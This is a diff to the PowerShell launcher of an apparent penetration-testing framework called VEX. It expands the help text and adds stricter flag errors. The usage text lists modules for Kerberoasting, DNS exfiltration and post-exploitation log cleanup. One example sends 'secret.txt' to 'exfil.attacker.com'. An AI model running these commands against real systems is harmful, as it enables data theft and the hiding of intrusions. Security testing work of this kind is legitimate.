@@ -264,22 +264,81 @@ function Invoke-Module ([string]$Category, [string]$ScriptName, [string[]]$Extra
 # Usage
 # ---------------------------------------------------------------------------
 function Show-Usage {
-    $cats = Get-Categories "  "
+    Write-Host "VEX 1.0.0 ( https://github.com/voido/VEX )" -ForegroundColor White
+    Write-Host 'Usage: vex [Global Flags] {category} {script} [Script Options]' -ForegroundColor White
     Write-Host @"
-Usage:
-  vex <category> <script> [args...]       Run a module script
-  vex <category> <script> -ai [args...]   Run with AI-assisted context
-  vex -l [category]                       List available modules
-  vex -h                                  Show this help
-
-Categories:
-$cats
-
-Examples:
+GLOBAL FLAGS:
+  -h, --help                          Print this help summary
+  -l, --list [category]               List available modules (optionally filter by category)
+  -ai                                 Enable AI-assisted context for any module
+MODULE EXECUTION:
+  vex <category> <script> [args...]   Dynamically discover and run a module script
+                                      Extension (.py / .sh) is optional; VEX resolves it automatically
+CATEGORIES:
+  active-directory    Active Directory attacks (Kerberoasting, etc.)
+  cloud               Cloud service enumeration (AWS S3, etc.)
+  exfil               Data exfiltration techniques (DNS tunnelling, etc.)
+  mobile              Mobile application analysis (APK decompilation, etc.)
+  network             Network scanning and enumeration (port scans, etc.)
+  os                  OS-level reconnaissance (SUID scan, etc.)
+  post-ex             Post-exploitation cleanup and persistence
+  web                 Web application reconnaissance and testing
+SCRIPT OPTIONS (per module — pass -h to any script for details):
+  active-directory/kerberoast:
+    -d, --domain <domain>             Target domain (e.g. corp.local)
+    -u, --user <username>             Domain username
+    -p, --password <password>         Domain password
+    -dc, --dc-ip <ip>                 Domain controller IP
+    -o, --output <file>               Save hashes to file
+  cloud/aws_s3_enum:
+    -b, --bucket <name>               Specific bucket name to probe
+    -p, --profile <profile>           AWS CLI profile (default: default)
+  exfil/dns_exfil:
+    -f, --file <path>                 File to exfiltrate
+    -d, --domain <domain>             Attacker-controlled DNS domain
+    -c, --chunk-size <bytes>          Bytes per DNS label (default: 30)
+    --delay <seconds>                 Seconds between queries (default: 0.5)
+  mobile/apk_decompile:
+    <apk_file>                        Path to APK file
+    -o, --output <dir>                Output directory
+  network/port_scan:
+    <target>                          Target host or CIDR
+    -p, --ports <range>               Port range (default: 1-1024)
+    -o, --output <prefix>             Output file prefix (saved to loot/)
+  os/linux_suid_scan:                 [Linux only]
+    -o, --output <file>               Write results to file
+  post-ex/cleanup_logs:               [Linux/macOS only]
+    -n, --dry-run                     Show what would be removed without deleting
+    -v, --verbose                     Verbose output
+  web/recon:
+    -t, --target <url>                Target URL (e.g. https://example.com)
+    -o, --output <file>               Write results to file
+AI INTEGRATION:
+  VEX_AI_KEY                          Set in environment to enable live AI queries
+  VEX_AI_ENDPOINT                     LLM API endpoint (default: OpenAI-compatible)
+  VEX_AI_MODEL                        Model name (default: gpt-4o)
+OUTPUT:
+  All module output is saved to the loot/ directory by default.
+  Use -o on individual modules to customise output location.
+CONFIGURATION:
+  data/config.ini                     Global framework settings
+  data/config.local.ini               Local overrides (git-ignored)
+PLATFORM SUPPORT:
+  Windows                             Native via PowerShell; .sh modules delegate to WSL
+  macOS                               Native via Bash and Python 3
+  Linux                               Native via Bash and Python 3
+EXAMPLES:
   vex web recon -t https://example.com
-  vex network port_scan 192.168.1.0/24
-  vex active-directory kerberoast -d corp.local -u admin -p pass
-  vex -l web
+  vex network port_scan 192.168.1.0/24 -p 1-65535
+  vex active-directory kerberoast -d corp.local -u admin -p pass -o hashes.txt
+  vex cloud aws_s3_enum -b my-bucket -p prod
+  vex exfil dns_exfil -f secret.txt -d exfil.attacker.com --delay 0.1
+  vex mobile apk_decompile target.apk -o ./output
+  vex post-ex cleanup_logs -n -v
+  vex os linux_suid_scan -o suid_results.txt
+  vex -l network
+  vex web recon -ai -t https://example.com
+SEE THE README (https://github.com/voido/VEX) FOR MORE INFORMATION
 "@
 }
 
@@ -302,8 +361,14 @@ switch ($cmd) {
         Show-Modules $cat
     }
     default {
+        if ($cmd.StartsWith("-")) {
+            Write-Err "Unknown flag: $cmd"
+            Write-Host "  Run 'vex -h' for usage." -ForegroundColor Gray
+            exit 1
+        }
         if ($args.Count -lt 2) {
-            Show-Usage
+            Write-Err "Missing script name. Usage: vex <category> <script> [args...]"
+            Write-Host "  Run 'vex -h' for help or 'vex -l' to list modules." -ForegroundColor Gray
             exit 1
         }
         $extra = if ($args.Count -gt 2) { $args[2..($args.Count - 1)] } else { @() }
